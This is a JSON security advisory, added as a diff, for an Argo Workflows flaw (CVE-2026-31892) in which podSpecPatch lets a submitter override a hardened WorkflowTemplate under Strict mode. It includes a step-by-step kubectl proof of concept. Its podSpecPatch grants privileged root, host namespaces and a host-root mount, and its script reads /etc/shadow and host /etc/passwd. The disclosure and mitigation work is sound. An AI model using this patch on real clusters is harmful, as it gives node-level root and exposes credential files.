@@ -1,0 +1,97 @@
+{
+  "id": "GHSA-3wf5-g532-rcrr",
+  "modified": "2026-03-13T10:56:06.596093110Z",
+  "published": "2026-03-11T19:29:33Z",
+  "aliases": [
+    "BIT-argo-workflows-2026-31892",
+    "CVE-2026-31892"
+  ],
+  "related": [
+    "CGA-pg6c-j3hv-fx66"
+  ],
+  "summary": "Argo Workflows: WorkflowTemplate Security Bypass via podSpecPatch in Strict/Secure Reference Mode",
+  "details": "## Summary\n\nA user who can submit Workflows can completely bypass all security settings defined in a `WorkflowTemplate` by including a `podSpecPatch` field in their Workflow submission. This works even when the controller is configured with `templateReferencing: Strict`, which is specifically documented as a mechanism to restrict users to admin-approved templates. The `podSpecPatch` field on a submitted Workflow takes precedence over the referenced `WorkflowTemplate` during spec merging and is applied directly to the pod spec at creation time with no security validation.\n\n## Details\n\nThree issues combine to create this vulnerability:\n\n1. Merge priority order:`JoinWorkflowSpec` merges specs with the priority order Workflow Spec \u003e WorkflowTemplate Spec \u003e WorkflowDefault Spec. Because `podSpecPatch` is a plain string field, the Workflow's value replaces the WorkflowTemplate's value.\n\n2. No security validation on `podSpecPatch`: `ApplyPodSpecPatch()` only validates that the patch is syntactically valid JSON conforming to the Kubernetes `PodSpec` schema. No checks are performed for dangerous security settings such as `privileged: true`.\n\n3. `templateReferencing: Strict` does not restrict `podSpecPatch`: Strict mode only checks whether `WorkflowTemplateRef` is set. If it is, the Workflow passes validation regardless of what other fields (including `podSpecPatch`) are present.\n\n## PoC\n\n### Prerequisites\n\nA local Kubernetes cluster with Argo Workflows installed. The instructions below use [kind](https://kind.sigs.k8s.io/).\n\n#### 1. Create a kind cluster and install Argo Workflows\n\n```bash\nkind create cluster --name argo-poc\n\nkubectl create namespace argo\nkubectl apply -n argo --server-side \\\n  -f https://github.com/argoproj/argo-workflows/releases/download/v4.0.1/install.yaml\n```\n\nNote: `--server-side` is required because some CRDs exceed the client-side annotation size limit.\n\nWait for the controller to be ready:\n\n```bash\nkubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s\n```\n\n#### 2. Enable `templateReferencing: Strict`\n\nPatch the workflow controller configmap to enforce Strict mode:\n\n```bash\nkubectl patch configmap workflow-controller-configmap -n argo --type merge \\\n  -p '{\"data\":{\"workflowRestrictions\":\"templateReferencing: Strict\\n\"}}'\n```\n\nRestart the controller to pick up the new config:\n\n```bash\nkubectl rollout restart deployment workflow-controller -n argo\nkubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s\n```\n\n#### 3. Verify Strict mode is active\n\nAttempt to submit a standalone Workflow (no `workflowTemplateRef`). It should be rejected:\n\n```bash\ncat \u003c\u003c'EOF' | kubectl create -n argo -f -\napiVersion: argoproj.io/v1alpha1\nkind: Workflow\nmetadata:\n  generateName: strict-test-\nspec:\n  entrypoint: test\n  templates:\n  - name: test\n    container:\n      image: alpine\n      command: [echo, \"hello\"]\nEOF\n```\n\nThe Workflow will be accepted by the API server but the controller will reject it. After a few seconds, check its status:\n\n```bash\nSTRICT_WF=$(kubectl get workflow -n argo -o name | grep strict-test | tail -1)\nkubectl get -n argo \"$STRICT_WF\" -o jsonpath='{.status.phase} {.status.message}'\n```\n\nExpected output:\n\n```\nError workflows must use workflowTemplateRef to be executed when the controller is in reference mode\n```\n\n#### 4: Create a hardened WorkflowTemplate\n\nAn administrator creates a `WorkflowTemplate` with restrictive security settings:\n\n```bash\ncat \u003c\u003c'EOF' | kubectl apply -n argo -f -\napiVersion: argoproj.io/v1alpha1\nkind: WorkflowTemplate\nmetadata:\n  name: secure-template\n  namespace: argo\n  annotations:\n    description: \"Admin-approved secure template with hardened security settings\"\nspec:\n  entrypoint: secure-task\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n    fsGroup: 1000\n  templates:\n  - name: secure-task\n    container:\n      image: alpine:latest\n      command: [\"/bin/sh\", \"-c\"]\n      args:\n        - |\n          echo \"=== Security Context Check ===\"\n          echo \"Current UID: $(id -u)\"\n          echo \"Current GID: $(id -g)\"\n          if cat /etc/shadow 2\u003e/dev/null; then\n            echo \"EXPLOITED: Can read /etc/shadow!\"\n          else\n            echo \"SECURE: Cannot read /etc/shadow\"\n          fi\n          if ls /host/etc/passwd 2\u003e/dev/null; then\n            echo \"EXPLOITED: Host filesystem accessible!\"\n            cat /host/etc/passwd | head -5\n          else\n            echo \"SECURE: No host filesystem access\"\n          fi\n          if [ \"$(id -u)\" = \"0\" ]; then\n            echo \"EXPLOITED: Running as root!\"\n          else\n            echo \"SECURE: Running as non-root (UID: $(id -u))\"\n          fi\n          echo \"=== End Check ===\"\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 1000\n        allowPrivilegeEscalation: false\n        capabilities:\n          drop:\n            - ALL\nEOF\n```\n\n#### 5. Submit a legitimate Workflow (baseline)\n\nSubmit a Workflow that references the secure template without modification:\n\n```bash\ncat \u003c\u003c'EOF' | kubectl create -n argo -f -\napiVersion: argoproj.io/v1alpha1\nkind: Workflow\nmetadata:\n  generateName: legit-use-\n  namespace: argo\nspec:\n  workflowTemplateRef:\n    name: secure-template\nEOF\n```\n\nWait for completion and check logs:\n\n```bash\nLEGIT_WF=$(kubectl get workflow -n argo -o name | grep legit-use | tail -1)\nkubectl wait -n argo --for=condition=Completed \"$LEGIT_WF\" --timeout=120s\nkubectl logs -n argo -l \"workflows.argoproj.io/workflow=$(basename $LEGIT_WF)\" -c main\n```\n\nExpected output (confirming the template's security settings are applied):\n\n```\n=== Security Context Check ===\nCurrent UID: 1000\nCurrent GID: 0\nSECURE: Cannot read /etc/shadow\nSECURE: No host filesystem access\nSECURE: Running as non-root (UID: 1000)\n=== End Check ===\n```\n\n#### 6. Submit the bypass Workflow\n\nSubmit a Workflow that references the same secure template but includes a `podSpecPatch` that overrides all security settings:\n\n```bash\ncat \u003c\u003c'EOF' | kubectl create -n argo -f -\napiVersion: argoproj.io/v1alpha1\nkind: Workflow\nmetadata:\n  generateName: bypass-security-\n  namespace: argo\nspec:\n  workflowTemplateRef:\n    name: secure-template\n  podSpecPatch: |\n    hostPID: true\n    hostNetwork: true\n    containers:\n    - name: main\n      securityContext:\n        privileged: true\n        runAsUser: 0\n        runAsNonRoot: false\n        allowPrivilegeEscalation: true\n        capabilities:\n          add:\n            - ALL\n          drop: []\n      volumeMounts:\n      - name: host-root\n        mountPath: /host\n    volumes:\n    - name: host-root\n      hostPath:\n        path: /\n        type: Directory\nEOF\n```\n\nWait for completion and check logs:\n\n```bash\nBYPASS_WF=$(kubectl get workflow -n argo -o name | grep bypass-security | tail -1)\nkubectl wait -n argo --for=condition=Completed \"$BYPASS_WF\" --timeout=120s\nkubectl logs -n argo -l \"workflows.argoproj.io/workflow=$(basename $BYPASS_WF)\" -c main\n```\n\nExpected output (all security settings bypassed):\n\n```\n=== Security Context Check ===\nCurrent UID: 0\nCurrent GID: 0\nroot:*::0:::::\nbin:!::0:::::\n[... /etc/shadow contents dumped ...]\nEXPLOITED: Can read /etc/shadow!\nEXPLOITED: Host filesystem accessible!\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n[... host /etc/passwd contents ...]\nEXPLOITED: Running as root!\n=== End Check ===\n```\n\nThe file `/etc/shadow` is readable (root), the host filesystem is mounted and accessible, and the container runs as UID 0.\n\n## Impact\n\nThe purpose of `templateReferencing: Strict` is to restrict users to only execute admin-approved `WorkflowTemplates`. This is explicitly [documented](https://argo-workflows.readthedocs.io/en/latest/security/) as a security feature:\n\n\u003e You can typically further restrict what a user can do to just being able to submit workflows from templates using the workflow restrictions feature.\n\nA user who can submit Workflows referencing approved templates can use `podSpecPatch` to:\n\n- Run containers as root (`runAsUser: 0`)\n- Enable privileged mode (`privileged: true`)\n- Mount the host filesystem (`hostPath` volumes)\n- Share host PID/network/IPC namespaces (`hostPID`, `hostNetwork`, `hostIPC`)\n- Add all Linux capabilities (`capabilities.add: [\"ALL\"]`)\n\nThis effectively grants the user full root access to the underlying Kubernetes node, regardless of what security constraints the admin configured in the `WorkflowTemplate`.\n\nThe `templateReferencing` feature was introduced in Argo Workflows v2.9.0 through PR #3149.\n\n## Mitigation\n\nWhen `templateReferencing: Strict` or `Secure` is enabled, the controller should reject Workflows that include a `podSpecPatch` field when using `workflowTemplateRef`.\n\nWithout the codefix, deploying an admission controller (OPA/Gatekeeper, Kyverno) with policies that block dangerous pod settings (`privileged`, `hostPID`, `hostNetwork`, `hostIPC`, `hostPath`) on pods created by Argo Workflows.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/argoproj/argo-workflows/v4",
+        "purl": "pkg:golang/github.com/argoproj/argo-workflows/v4"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.0.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-3wf5-g532-rcrr/GHSA-3wf5-g532-rcrr.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/argoproj/argo-workflows/v3",
+        "purl": "pkg:golang/github.com/argoproj/argo-workflows/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.7.11"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-3wf5-g532-rcrr/GHSA-3wf5-g532-rcrr.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/argoproj/argo-workflows",
+        "purl": "pkg:golang/github.com/argoproj/argo-workflows"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "2.9.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c 3.0.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-3wf5-g532-rcrr/GHSA-3wf5-g532-rcrr.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3wf5-g532-rcrr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31892"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/argoproj/argo-workflows"
+    }
+  ]
+}
